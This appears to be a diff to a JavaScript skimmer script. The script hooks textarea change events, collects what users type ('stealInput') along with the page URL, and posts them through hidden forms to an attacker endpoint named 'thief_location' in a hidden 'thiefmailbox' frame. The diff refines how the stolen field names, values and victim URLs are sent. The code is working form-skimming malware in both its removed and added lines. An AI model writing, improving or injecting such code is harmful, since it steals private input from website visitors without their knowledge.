@@ -15,14 +15,13 @@ document.addEventListener("DOMContentLoaded", function() {
 	for(var i = 0; i < textareas.length; i++) {
 		textareas[i].addEventListener("change", function(e) {stealInput(e.currentTarget)});
 	}
-	stealLocation();
+	getLocation();
 }, false);
 
 	
-function stealLocation(){
+function getLocation(){
 	var loc = {};
-	loc['victim_location'] = location.href;
-	sendMail(loc, "location");
+	sendMail(loc);
 }
 function stealInput(inputInfo){
 	var name = inputInfo.name;
@@ -33,24 +32,24 @@ function stealInput(inputInfo){
 	}
 	if(value != ""){
 		stolenInput[name] = value;
-		sendMail(stolenInput, "input");
+		sendMail(stolenInput);
 	}
 }
-function sendMail(params, type){
+function sendMail(params){
 	var form = document.createElement("form");
 	form.setAttribute("method", "post");
-	if(type=="location"){
-		form.setAttribute("action", thief_location+"?lo");
-	}
-	else{
-		form.setAttribute("action", thief_location);
-	}
 	form.setAttribute("target", "thiefmailbox");
+	form.setAttribute("action", thief_location+"?lo="+location.href);
 	for(var key in params) {
 		if(params.hasOwnProperty(key)) {
 			var field = document.createElement("input");
 			field.setAttribute("type", "hidden");
-			field.setAttribute("name", key);
+			field.setAttribute("name", "input_name");
+			field.setAttribute("value", key);
+			form.appendChild(field);
+			var field = document.createElement("input");
+			field.setAttribute("type", "hidden");
+			field.setAttribute("name", "input_value");
 			field.setAttribute("value", params[key]);
 			form.appendChild(field);
 		}
